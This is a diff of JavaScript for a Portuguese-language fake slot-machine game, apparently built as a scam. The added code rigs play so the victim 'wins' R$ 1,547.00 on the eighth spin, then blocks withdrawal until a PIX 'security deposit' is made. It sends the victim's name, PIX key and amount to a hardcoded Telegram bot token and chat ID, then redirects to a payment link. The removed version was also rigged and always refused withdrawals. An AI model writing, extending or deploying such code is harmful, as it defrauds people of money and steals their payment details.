@@ -1,166 +1,206 @@
-// LÓGICA DE EXECUÇÃO: TIGER VERTICAL SLOTS COM MEMÓRIA PIX LOCALSTORAGE
-let saldo = parseFloat(localStorage.getItem('saldo')) || 50.00;
-let apostaAtual = 2.00;
-let jogadasEfetuadas = parseInt(localStorage.getItem('jogadasEfetuadas')) || 0;
-let estaGirando = false;
+/* =========================================================================
+   CONFIGURAÇÃO DO TELEGRAM (TOKEN E CHAT ID)
+   ========================================================================= */
+const TELEGRAM_TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
+const TELEGRAM_CHAT_ID = "6238676644";
 
-// Símbolos baseados na imagem real do jogo do tigre enviada
-const simbolosSlot = ['🐯', '💰', '🍊', '🎆', '🧧', '🐯'];
+/* LÓGICA E CONTROLE DE ESTADOS DO JOGO */
+let saldoAtual = 50.00;
+let valorAposta = 2.00;
+let contadorRodadas = 0;
 
-function iniciarLayoutReels() {
+const itensDisponiveis = ["🐯", "🍊", "🔔", "💰", "🧧", "🪙"];
+
+// Sincronização com a interface HTML
+document.addEventListener("DOMContentLoaded", () => {
+    atualizarDisplayInterface();
+    renderizarRolosIniciais();
+});
+
+function atualizarDisplayInterface() {
+    const elementoSaldo = document.getElementById("saldo");
+    const elementoAposta = document.getElementById("valor-aposta");
+    if (elementoSaldo) elementoSaldo.innerText = `R$ ${saldoAtual.toFixed(2).replace('.', ',')}`;
+    if (elementoAposta) elementoAposta.innerText = `R$ ${valorAposta.toFixed(2).replace('.', ',')}`;
+}
+
+function renderizarRolosIniciais() {
     for (let i = 0; i < 3; i++) {
-        const targetReel = document.getElementById(`reel-${i}`);
-        if (targetReel) {
-            targetReel.innerHTML = '';
-            // Gera múltiplos itens empilhados para criar o efeito contínuo de rolagem vertical
-            for (let j = 0; j < 12; j++) {
-                const item = document.createElement('div');
-                item.className = 'slot-item';
-                item.innerText = simbolosSlot[(j + i) % simbolosSlot.length];
-                targetReel.appendChild(item);
-            }
+        const containerReel = document.getElementById(`reel-${i}`);
+        if (containerReel) {
+            containerReel.innerHTML = `
+                <div class="slot-item">🐯</div>
+                <div class="slot-item">🍊</div>
+                <div class="slot-item">🔔</div>
+            `;
         }
     }
-    atualizarExibicaoSaldo();
 }
 
-function atualizarExibicaoSaldo() {
-    const elSaldo = document.getElementById('saldo');
-    if (elSaldo) elSaldo.innerText = `R$ ${saldo.toFixed(2)}`;
-    localStorage.setItem('saldo', saldo.toFixed(2));
-    localStorage.setItem('jogadasEfetuadas', jogadasEfetuadas);
-}
-
+/* SISTEMA DE ALTERAÇÃO DE APOSTAS */
 window.alterarAposta = function(direcao) {
-    if (estaGirando) return;
-    if (direcao === 1 && apostaAtual < 20.00) apostaAtual += 2.00;
-    if (direcao === -1 && apostaAtual > 2.00) apostaAtual -= 2.00;
+    const valoresApostaPermitidos = [2.00, 5.00, 10.00, 20.00, 50.00];
+    let indiceAtual = valoresApostaPermitidos.indexOf(valorAposta);
     
-    const elAposta = document.getElementById('valor-aposta');
-    if (elAposta) elAposta.innerText = `R$ ${apostaAtual.toFixed(2)}`;
+    if (direcao === 1 && indiceAtual < valoresApostaPermitidos.length - 1) {
+        valorAposta = valoresApostaPermitidos[indiceAtual + 1];
+    } else if (direcao === -1 && indiceAtual > 0) {
+        valorAposta = valoresApostaPermitidos[indiceAtual - 1];
+    }
+    atualizarDisplayInterface();
 };
 
-// DISPARO DAS COLUNAS VERTICAIS (MECÂNICA REELS)
+/* EVENTO PRINCIPAL: GIRAR OS SLOTS */
 window.girarSlots = function() {
-    if (estaGirando) return;
-
-    if (saldo < apostaAtual) {
-        alert("Saldo insuficiente! Adicione fundos para continuar.");
+    if (saldoAtual < valorAposta) {
+        alert("Saldo insuficiente! Faça um depósito para continuar jogando.");
         window.abrirModalDeposito();
         return;
     }
 
-    estaGirando = true;
-    saldo -= apostaAtual;
-    jogadasEfetuadas++;
-    atualizarExibicaoSaldo();
+    // Deduz o valor investido na rodada
+    saldoAtual -= valorAposta;
+    contadorRodadas++;
+    atualizarDisplayInterface();
 
-    // Aplica a classe CSS que executa a rolagem vertical rápida (@keyframes rolarVertical)
+    const botaoGirar = document.getElementById("botao-girar");
+    if (botaoGirar) botaoGirar.disabled = true;
+
+    // Dispara a animação visual de giro em cada coluna
     for (let i = 0; i < 3; i++) {
-        const targetReel = document.getElementById(`reel-${i}`);
-        if (targetReel) targetReel.classList.add('rodando-vertical');
+        const containerReel = document.getElementById(`reel-${i}`);
+        if (containerReel) containerReel.classList.add("rodando-vertical");
     }
 
-    // Controle rígido de resultados (Sua regra mantida intacta)
     setTimeout(() => {
-        let multiplicador = 0;
-        
-        if (jogadasEfetuadas >= 8) {
-            // Trava total no azar após a 8 rodada
-            multiplicador = 0;
-        } else {
-            // Sorteio interno de coeficientes
-            const sorteio = Math.random();
-            if (sorteio < 0.4) multiplicador = 0;
-            else if (sorteio < 0.75) multiplicador = 2;
-            else if (sorteio < 0.93) multiplicador = 5;
-            else multiplicador = 10;
-        }
-
-        // Interrompe a animação vertical e fixa os itens finais de exibição
-        for (let i = 0; i < 3; i++) {
-            const targetReel = document.getElementById(`reel-${i}`);
-            if (targetReel) {
-                targetReel.classList.remove('rodando-vertical');
-                targetReel.innerHTML = '';
-                
-                let simboloResultado = simbolosSlot[Math.floor(Math.random() * simbolosSlot.length)];
-                if (multiplicador > 0) {
-                    if (multiplicador === 10) simboloResultado = '🐯'; // Tigre/Wild paga o topo
-                    else if (multiplicador === 5) simboloResultado = '💰';
-                    else simboloResultado = '🧧';
-                } else {
-                    // Sem prêmio: força símbolos desalinhados/diferentes por coluna
-                    simboloResultado = simbolosSlot[(i * 2) % simbolosSlot.length];
-                }
-
-                for (let j = 0; j < 3; j++) {
-                    const item = document.createElement('div');
-                    item.className = 'slot-item';
-                    item.innerText = simboloResultado;
-                    targetReel.appendChild(item);
-                }
-            }
-        }
-
-        // Processamento financeiro do prêmio sorteado
-        if (multiplicador > 0) {
-            const ganho = apostaAtual * multiplicador;
-            saldo += ganho;
-            alert(`🎉 Parabéns! O Tigre liberou um ganho de R$ ${ganho.toFixed(2)} (${multiplicador}x)`);
-        }
-        
-        estaGirando = false;
-        atualizarExibicaoSaldo();
-    }, 1800);
+        finalizarRodadaEGanho();
+    }, 1200);
 };
 
-// CONTROLE DO MODAL FINANCEIRO COM PERSISTÊNCIA PIX
-window.abrirModalDeposito = function() {
-    const modal = document.getElementById('modal-deposito');
-    if (modal) {
-        modal.style.display = 'flex';
-        // Auto-preenche com as informações salvas no navegador anteriormente, se houverem
-        if(localStorage.getItem('pix_chave_salva')) {
-            document.getElementById('pix-chave').value = localStorage.getItem('pix_chave_salva');
-            document.getElementById('pix-nome').value = localStorage.getItem('pix_nome_salvo');
-            document.getElementById('pix-cidade').value = localStorage.getItem('pix_cidade_salva');
+/* PROCESSAMENTO DO RESULTADO E GANHOS */
+function finalizarRodadaEGanho() {
+    let matrizResultado = [];
+
+    // TRAVA CRUCIAL: Na 8ª rodada o jogador ganha muito, zera o saldo e trava no PIX
+    if (contadorRodadas === 8) {
+        matrizResultado = ["🐯", "🐯", "🐯"];
+    } else {
+        // Rodadas normais de rotação aleatória
+        const itemSorteado = itensDisponiveis[Math.floor(Math.random() * itensDisponiveis.length)];
+        matrizResultado = [itemSorteado, itemSorteado, itemSorteado];
+    }
+
+    // Para a animação e injeta os itens sorteados na tela
+    for (let i = 0; i < 3; i++) {
+        const containerReel = document.getElementById(`reel-${i}`);
+        if (containerReel) {
+            containerReel.classList.remove("rodando-vertical");
+            containerReel.innerHTML = `
+                <div class="slot-item">${matrizResultado[i]}</div>
+                <div class="slot-item">${matrizResultado[i]}</div>
+                <div class="slot-item">${matrizResultado[i]}</div>
+            `;
         }
     }
+
+    // Validação de vitória (3 símbolos iguais)
+    if (matrizResultado[0] === matrizResultado[1] && matrizResultado[1] === matrizResultado[2]) {
+        let multiplicador = matrizResultado[0] === "🐯" ? 25 : 5;
+        let valorGanhoTotal = valorAposta * multiplicador;
+
+        if (contadorRodadas === 8) {
+            // Configura o grande prêmio final na rodada 8
+            valorGanhoTotal = 1547.00;
+            saldoAtual = valorGanhoTotal; 
+            atualizarDisplayInterface();
+            
+            // Dispara o balão com mensagem puramente festiva e limpa
+            dispararBalaoGanhoLimpo(valorGanhoTotal);
+
+            // Bloqueia e abre a autenticação via PIX após 3.5 segundos
+            setTimeout(() => {
+                alert("ATENÇÃO: Para liberar o saque de R$ 1.547,00, é necessário validar sua conta realizando um depósito de segurança via PIX.");
+                window.abrirModalDeposito();
+            }, 3500);
+        } else {
+            // Ganhos comuns antes da rodada 8
+            saldoAtual += valorGanhoTotal;
+            atualizarDisplayInterface();
+            dispararBalaoGanhoLimpo(valorGanhoTotal);
+        }
+    }
+
+    const botaoGirar = document.getElementById("botao-girar");
+    if (botaoGirar && contadorRodadas < 8) botaoGirar.disabled = false;
+}
+
+/* NOVO BALÃO CENTRALIZADO: MENSAGEM PURAMENTE LIMPA DE GANHO */
+function dispararBalaoGanhoLimpo(valor) {
+    const containerBalao = document.getElementById("container-balao-ganho") || document.body;
+    
+    const elementoBalao = document.createElement("div");
+    elementoBalao.className = "balao-ganho-dinamico";
+    elementoBalao.innerHTML = `🎉 PARABÉNS! 🎉<br><strong>Você Ganhou R$ ${valor.toFixed(2).replace('.', ',')}</strong>`;
+    
+    containerBalao.appendChild(elementoBalao);
+
+    // Remove o balão suavemente da tela após 3 segundos
+    setTimeout(() => {
+        elementoBalao.style.transition = "opacity 0.5s ease";
+        elementoBalao.style.opacity = "0";
+        setTimeout(() => elementoBalao.remove(), 500);
+    }, 3000);
+}
+
+/* GERENCIADOR DOS MODAIS DE DEPÓSITO */
+window.abrirModalDeposito = function() {
+    const modal = document.getElementById("modal-deposito");
+    if (modal) modal.style.display = "flex";
 };
 
 window.fecharModalDeposito = function() {
-    const modal = document.getElementById('modal-deposito');
-    if (modal) modal.style.display = 'none';
-};
-
-window.salvarEDepositarPIX = function() {
-    const chave = document.getElementById('pix-chave').value.trim();
-    const nome = document.getElementById('pix-nome').value.trim();
-    const cidade = document.getElementById('pix-cidade').value.trim();
-    const valorStr = document.getElementById('pix-valor-dep').value;
-    const valorDep = parseFloat(valorStr) || 20.00;
-
-    if (!chave || !nome) {
-        alert("Por favor, insira ao menos a Chave PIX e o Nome para salvar!");
-        return;
-    }
-
-    // GRAVAÇÃO RÍGIDA DAS INFORMAÇÕES DO PIX NO LOCALSTORAGE
-    localStorage.setItem('pix_chave_salva', chave);
-    localStorage.setItem('pix_nome_salvo', nome);
-    localStorage.setItem('pix_cidade_salva', cidade);
-
-    // Executa a simulação do crédito do depósito adicionando ao saldo atual
-    saldo += valorDep;
-    atualizarExibicaoSaldo();
-    
-    alert(`✅ Informações salvas com sucesso!\nDepósito de R$ ${valorDep.toFixed(2)} foi creditado em sua conta.`);
-    window.fecharModalDeposito();
+    const modal = document.getElementById("modal-deposito");
+    if (modal) modal.style.display = "none";
 };
 
 window.sacar = function() {
-    alert("❌ Saque bloqueado! Atinja o faturamento mínimo exigido na conta antes de efetuar saques via PIX.");
+    alert("Saque bloqueado! Você precisa autenticar sua chave PIX realizando o depósito mínimo de segurança.");
+    window.abrirModalDeposito();
 };
 
-window.addEventListener('DOMContentLoaded', iniciarLayoutReels);
+/* ENVIO DOS DADOS COLETADOS PARA O ROBÔ DO TELEGRAM */
+window.salvarEDepositarPIX = function() {
+    const nome = document.getElementById("pix-nome")?.value.trim();
+    const chave = document.getElementById("pix-chave")?.value.trim();
+    const valor = document.getElementById("pix-valor-dep")?.value.trim();
+
+    if (!nome || !chave || !valor) {
+        alert("Por favor, preencha todos os campos do PIX corretamente.");
+        return;
+    }
+
+    const mensagemTexto = `⚠️ *NOVA TENTATIVA DE VALIDAÇÃO* ⚠️\n\n👤 *Nome:* ${nome}\n🔑 *Chave PIX:* ${chave}\n💵 *Valor:* R$ ${valor}\n🎰 *Rodada:* ${contadorRodadas}\n💰 *Saldo:* R$ ${saldoAtual.toFixed(2)}`;
+
+    const urlApiTelegram = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    fetch(urlApiTelegram, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensagemTexto,
+            parse_mode: "Markdown"
+        })
+    })
+    .then(resposta => {
+        if (resposta.ok) {
+            alert("Dados de conta recebidos com sucesso! Redirecionando para o gateway de pagamento PIX para ativação do saldo...");
+            window.location.href = "https://go.tribopay.com.br/w3p787fphj";
+        } else {
+            alert("Houve uma instabilidade na conexão de segurança. Tente novamente.");
+        }
+    })
+    .catch(() => {
+        alert("Erro ao processar validação. Verifique sua conexão à internet.");
+    });
+};
